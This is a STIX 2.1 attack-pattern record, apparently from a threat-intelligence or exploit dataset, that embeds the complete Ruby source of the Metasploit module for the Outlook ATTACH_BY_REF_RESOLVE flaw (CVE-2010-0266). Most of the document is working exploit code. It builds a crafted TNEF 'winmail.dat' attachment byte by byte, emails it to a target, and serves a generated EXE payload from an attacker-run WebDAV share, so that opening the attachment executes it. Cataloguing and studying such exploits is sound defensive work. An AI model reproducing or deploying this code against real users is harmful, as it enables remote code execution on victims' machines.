{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6100cab2-7460-4297-86b6-669ea6386f56",
    "created": "2024-08-14T16:38:56.12426Z",
    "modified": "2024-08-14T16:38:56.124264Z",
    "name": "Outlook ATTACH_BY_REF_RESOLVE File Execution",
    "description": " It has been discovered that certain e-mail message cause Outlook to create Windows shortcut-like attachments or messages within Outlook. Through specially crafted TNEF streams with certain MAPI attachment properties, it is possible to set a path name to files to be executed. When a user double clicks on such an attachment or message Outlook will proceed to execute the file that is set by the path name value. These files can be local files, but also file stored remotely for example on a file share. Exploitation is limited by the fact that its is not possible for attackers to supply command line options. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/email/ms10_045_outlook_ref_resolve.rb",
            "external_id": "ms10_045_outlook_ref_resolve.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0266"
        },
        {
            "source_name": "reference",
            "url": "http://www.akitasecurity.nl/advisory.php?id=AK20091001"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  # This module acts as an HTTP server\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  # This module also sends email\n  include Msf::Exploit::Remote::SMTPDeliver\n\n  # This module generates an EXE\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t\t=> 'Outlook ATTACH_BY_REF_RESOLVE File Execution',\n      'Description'\t\t=> %q{\n        It has been discovered that certain e-mail message cause Outlook to create Windows\n        shortcut-like attachments or messages within Outlook. Through specially crafted TNEF\n        streams with certain MAPI attachment properties, it is possible to set a path name\n        to files to be executed. When a user double clicks on such an attachment or message,\n        Outlook will proceed to execute the file that is set by the path name value. These\n        files can be local files, but also file stored remotely for example on a file share.\n        Exploitation is limited by the fact that its is not possible for attackers to supply\n        command line options.\n      },\n      'Author'\t\t=> 'Yorick Koster <yorick[at]akitasecurity.nl>',\n      'References'\t=>\n        [\n          ['MSB', 'MS10-045'],\n          ['CVE', '2010-0266'],\n          ['OSVDB', '66296'],\n          ['BID', '41446'],\n          ['URL', 'http://www.akitasecurity.nl/advisory.php?id=AK20091001'],\n        ],\n      'Stance'         => Msf::Exploit::Stance::Passive,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'Compat'      =>\n            {\n              'ConnectionType' => '-bind -find',\n            },\n\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        => [ [ 'Automatic', {} ] ],\n      'DisclosureDate' => '2010-06-01',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        #\n        # Email options\n        #\n        OptString.new('MESSAGECLASS',\n          [false, 'Message Class value', 'IPM.Document.txtfile']),\n        OptString.new('EXTENSION',\n          [false, 'The extension used in the fake file name', 'jpg']),\n        #\n        # WebDAV options\n        #\n        OptPort.new('SRVPORT',   [ true,  \"The daemon port to listen on (do not change)\", 80 ]),\n        OptString.new('URIPATH', [ true,  \"The URI to use (do not change).\", \"/\" ]),\n        OptString.new('UNCHOST', [ false, \"The host portion of the UNC path to provide to clients (ex: 1.2.3.4).\" ])\n      ])\n\n    deregister_options('SSL', 'SSLVersion') # Just for now\n  end\n\n  def on_request_uri(cli, request)\n\n    case request.method\n    when 'OPTIONS'\n      process_options(cli, request)\n    when 'PROPFIND'\n      process_propfind(cli, request)\n    when 'GET'\n      process_get(cli, request)\n    else\n      print_error(\"Unexpected request method encountered: #{request.method}\")\n      resp = create_response(404, \"Not Found\")\n      resp.body = \"\"\n      resp['Content-Type'] = 'text/html'\n      cli.send_response(resp)\n    end\n\n  end\n\n  def process_get(cli, request)\n\n    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    webdav = \"\\\\\\\\#{myhost}\\\\\"\n\n    if (request.uri =~ /\\.exe$/i)\n      print_status \"Sending EXE payload\"\n      return if ((p = regenerate_payload(cli)) == nil)\n      data = generate_payload_exe({ :code => p.encoded })\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    print_status \"Sending 404...\"\n    resp = create_response(404, \"Not Found\")\n    resp.body = \"\"\n    resp['Content-Type'] = 'text/html'\n    cli.send_response(resp)\n  end\n\n  #\n  # OPTIONS requests sent by the WebDav Mini-Redirector\n  #\n  def process_options(cli, request)\n    print_status(\"Responding to WebDAV OPTIONS request\")\n    headers = {\n      'MS-Author-Via' => 'DAV',\n#\t\t\t'DASL'          => '<DAV:sql>',\n#\t\t\t'DAV'           => '1, 2',\n      'Allow'         => 'OPTIONS, GET, PROPFIND',\n      'Public'        => 'OPTIONS, GET, PROPFIND'\n    }\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = \"\"\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  #\n  # PROPFIND requests sent by the WebDav Mini-Redirector\n  #\n  def process_propfind(cli, request)\n    path = request.uri\n    print_status(\"Received WebDAV PROPFIND request from: #{path}\")\n    body = ''\n\n    my_host   = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    my_uri    = \"http://#{my_host}/\"\n\n    if path =~ /\\.exe$/i\n      # Response for the DLL\n      print_status(\"Sending EXE multistatus for #{path} ...\")\n      body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{@exploit_dll}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>\n<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n\n      resp = create_response(207, \"Multi-Status\")\n      resp.body = body\n      resp['Content-Type'] = 'text/xml'\n      cli.send_response(resp)\n      return\n    end\n\n    if path !~ /\\/$/\n\n      if path.index(\".\")\n        print_status(\"Sending 404 for #{path} ...\")\n        resp = create_response(404, \"Not Found\")\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n        return\n      else\n        print_status(\"Sending 301 for #{path} ...\")\n        resp = create_response(301, \"Moved\")\n        resp[\"Location\"] = path + \"/\"\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n        return\n      end\n    end\n\n    print_status(\"Sending directory multistatus for #{path} ...\")\n    body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n  <D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n    <D:href>#{path}</D:href>\n    <D:propstat>\n      <D:prop>\n        <lp1:resourcetype><D:collection/></lp1:resourcetype>\n        <lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>\n        <lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>\n        <lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n        <D:supportedlock>\n          <D:lockentry>\n            <D:lockscope><D:exclusive/></D:lockscope>\n            <D:locktype><D:write/></D:locktype>\n          </D:lockentry>\n          <D:lockentry>\n            <D:lockscope><D:shared/></D:lockscope>\n            <D:locktype><D:write/></D:locktype>\n          </D:lockentry>\n        </D:supportedlock>\n        <D:lockdiscovery/>\n        <D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n      </D:prop>\n    <D:status>HTTP/1.1 200 OK</D:status>\n  </D:propstat>\n</D:response>\n|\n\n\n    subdirectory = %Q|\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{Rex::Text.rand_text_alpha(6)}/</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>\n<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n|\n\n    files = %Q|\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{@exploit_exe}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>\n<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n|\n    if request[\"Depth\"].to_i > 0\n      if path.scan(\"/\").length < 2\n        body << subdirectory\n      else\n        body << files\n      end\n    end\n\n    body << \"</D:multistatus>\"\n\n    body.gsub!(/\\t/, '')\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml; charset=\"utf8\"'\n    cli.send_response(resp)\n  end\n\n  def exploit\n\n    unc = nil\n    if (datastore['UNCHOST'])\n      unc = datastore['UNCHOST'].dup\n    else\n      unc = ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST'])\n    end\n\n    @exploit_unc_host = unc\n    @exploit_unc  = \"\\\\\\\\#{unc}\\\\#{rand_text_alpha(rand(8)+4)}\\\\\"\n    @exploit_exe  = rand_text_alpha(rand(8)+4) + \".exe\"\n\n    if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'\n      fail_with(Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')\n    end\n\n    msg = Rex::MIME::Message.new\n    msg.mime_defaults\n    msg.subject = datastore['SUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)\n    msg.to = datastore['MAILTO']\n    msg.from = datastore['MAILFROM']\n    body = Rex::Text.encode_base64(create_tnef_exploit(), \"\\r\\n\")\n    content_type = 'application/ms-tnef'\n    content_disposition = \"attachment; name=\\\"winmail.dat\\\"\"\n    msg.add_part(body, content_type, 'base64', content_disposition)\n    print_status(\"Sending message to the target...\")\n    send_message(msg.to_s)\n\n    print_status(\"Creating WebDAV service and waiting for connections...\")\n    super\n  end\n\n  def create_tnef_exploit\n    filename = Rex::Text.rand_text_alpha(8) << '.' << (datastore['EXTENSION'] || 'png') << \"\\x00\"\n    message_class = (datastore['MESSAGECLASS'] || 'IPM.Document.jpegfile') << \"\\x00\"\n    pathname = \"file://#{@exploit_unc_host}/#{rand_text_alpha(rand(8)+4)}/#{@exploit_exe}\\x00\"\n    print_status(\"Using UNC path: #{pathname}\")\n\n    # start of TNEF stream\n    sploit = create_tnef_header\n\n    # MAPI message properties\n    msgprops = \"\\x04\\x00\\x00\\x00\"\t\t\t# Count\t\t4\n\n    msgprops << \"\\x0b\\x00\"\t\t\t\t# Type\t\tPT_BOOLEAN\n    msgprops << \"\\x1b\\x0e\"\t\t\t\t# Name\t\tPR_HASATTACH\n    msgprops << \"\\x01\\x00\\x00\\x00\"\t\t\t# Value data\t1\n\n    msgprops << \"\\x1e\\x00\"\t\t\t\t# Type\t\tPT_STRING\n    msgprops << \"\\x1a\\x00\"\t\t\t\t# Name\t\tPR_MESSAGE_CLASS\n    msgprops << \"\\x01\\x00\\x00\\x00\"\t\t\t# Count values\t1\n    msgprops << [message_class.length].pack(\"V\")\t# Value length\n    msgprops << mapi_pad(message_class)\t\t# Value data\n\n    msgprops << \"\\x03\\x00\"\t\t\t\t# Type\t\tPT_INT\n    msgprops << \"\\xfe\\x0f\"\t\t\t\t# Name\t\tPR_OBJECT_TYPE\n    msgprops << \"\\x05\\x00\\x00\\x00\"\t\t\t# Value data\tMAPI_MESSAGE (5)\n\n    msgprops << \"\\x03\\x00\"\t\t\t\t# Type\t\tPT_INT\n    msgprops << \"\\x07\\x0e\"\t\t\t\t# Name\t\tPR_MESSAGE_FLAGS\n    msgprops << \"\\x12\\x00\\x00\\x00\"\t\t\t# Value data\t0x00000012\n\n    # add properties to TNEF stream\n    sploit << \"\\x01\"\t\t\t\t# Level type\tLVL_MESSAGE\n    sploit << \"\\x03\\x90\"\t\t\t\t# Name\t\tattMAPIProps (0x9003)\n    sploit << \"\\x06\\x00\"\t\t\t\t# Type\t\tatpByte (0x0006)\n    sploit << [msgprops.length].pack('V')\t\t# Len\n    sploit << msgprops\n    sploit << tnef_checksum(msgprops)\n\n    # start of TNEF attachment\n    sploit << \"\\x02\"\t\t\t\t# Level type\tLVL_ATTACHMENT\n    sploit << \"\\x02\\x90\"\t\t\t\t# Name\t\tattAttachRenddata (0x9002)\n    sploit << \"\\x06\\x00\"\t\t\t\t# Type\t\tatpByte (0x0006)\n    sploit << \"\\x0e\\x00\\x00\\x00\"\t\t\t# Len\t\t0x0000000e\n    sploit << \"\\x01\\x00\\xff\\xff\\xff\\xff\\x20\\x00\\x20\\x00\\x00\\x00\\x00\\x00\"\n    sploit << \"\\x3d\\x04\"\t\t\t\t# Checksum\n\n    # MAPI attachment properties\n    attprops = \"\\x04\\x00\\x00\\x00\"\t\t\t# Count\t\t4\n\n    attprops << \"\\x1e\\x00\"\t\t\t\t# Type\t\tPT_STRING\n    attprops << \"\\x07\\x37\"\t\t\t\t# Name\t\tPR_ATTACH_LONG_FILENAME\n    attprops << \"\\x01\\x00\\x00\\x00\"\t\t\t# Count values\t1\n    attprops << [filename.length].pack('V')\t\t# Value length\n    attprops << mapi_pad(filename)\t\t\t# Value data\n\n    attprops << \"\\x1e\\x00\"\t\t\t\t# Type\t\tPT_STRING\n    attprops << \"\\x0d\\x37\"\t\t\t\t# Name\t\tPR_ATTACH_LONG_PATHNAME\n    attprops << \"\\x01\\x00\\x00\\x00\"\t\t\t# Count values\t1\n    attprops << [pathname.length].pack('V')\t\t# Value length\n    attprops << mapi_pad(pathname)\t\t\t# Value data\n\n    attprops << \"\\x03\\x00\"\t\t\t\t# Type\t\tPT_INT\n    attprops << \"\\x05\\x37\"\t\t\t\t# Name\t\tPR_ATTACH_METHOD\n    attprops << \"\\x03\\x00\\x00\\x00\"\t\t\t# Value data\tATTACH_BY_REF_RESOLVE (3)\n\n    attprops << \"\\x03\\x00\"\t\t\t\t# Type\t\tPT_INT\n    attprops << \"\\xfe\\x0f\"\t\t\t\t# Name\t\tPR_OBJECT_TYPE\n    attprops << \"\\x07\\x00\\x00\\x00\"\t\t\t# Value data\tMAPI_ATTACH (7)\n\n    # add properties to TNEF stream\n    sploit << \"\\x02\"\t\t\t\t# Level type\tLVL_ATTACHMENT\n    sploit << \"\\x05\\x90\"\t\t\t\t# Name\t\tattAttachment (0x800f)\n    sploit << \"\\x06\\x00\"\t\t\t\t# Type\t\tatpByte (0x0006)\n    sploit << [attprops.length].pack('V')\t\t# Len\n    sploit << attprops\n    sploit << tnef_checksum(attprops)\n\n    return sploit\n  end\n\n  def create_tnef_header\n    # TNEF Header\n    buf = \"\\x78\\x9f\\x3e\\x22\"\t\t\t# Signature\t0x223e9f78\n    buf << \"\\x00\\x00\"\t\t\t\t# Key\n\n    # TNEF Attributes\n    buf << \"\\x01\"\t\t\t\t\t# Level type\tLVL_MESSAGE\n    buf << \"\\x06\\x90\"\t\t\t\t# Name\t\tattTnefVersion (0x9006)\n    buf << \"\\x08\\x00\"\t\t\t\t# Type\t\tatpDword (0x0008)\n    buf << \"\\x04\\x00\\x00\\x00\"\t\t\t# Len\t\t0x00000004\n    buf << \"\\x00\\x00\\x01\\x00\"\n    buf << \"\\x01\\x00\"\t\t\t\t# Checksum\n\n    buf << \"\\x01\"\t\t\t\t\t# Level type\tLVL_MESSAGE\n    buf << \"\\x07\\x90\"\t\t\t\t# Name\t\tattOemCodepage (0x9007)\n    buf << \"\\x06\\x00\"\t\t\t\t# Type\t\tatpByte (0x0006)\n    buf << \"\\x08\\x00\\x00\\x00\"\t\t\t# Len\t\t0x00000008\n    buf << \"\\xe4\\x04\\x00\\x00\\x00\\x00\\x00\\x00\"\n    buf << \"\\xe8\\x00\"\t\t\t\t# Checksum\n\n    buf << \"\\x01\"\t\t\t\t\t# Level type\tLVL_MESSAGE\n    buf << \"\\x0d\\x80\"\t\t\t\t# Name\t\tattPriority (0x800d)\n    buf << \"\\x04\\x00\"\t\t\t\t# Type\t\tatpShort (0x0004)\n    buf << \"\\x02\\x00\\x00\\x00\"\t\t\t# Len\t\t0x00000002\n    buf << \"\\x02\\x00\"\n    buf << \"\\x02\\x00\"\t\t\t\t# Checksum\n\n    return buf\n  end\n\n  def tnef_checksum(buf = '')\n    checksum = 0;\n\n    buf.each_byte { |b|\n      checksum += b\n    }\n\n    return [checksum % 65536].pack('v')\n  end\n\n  def mapi_pad(buf = '')\n    length = (buf.length + 3) & ~3\n\n    (buf.length..(length - 1)).each {\n      buf << \"\\x00\"\n    }\n\n    return buf\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-06-01",
    "x_mitre_platforms": [
        "win'"
    ]
}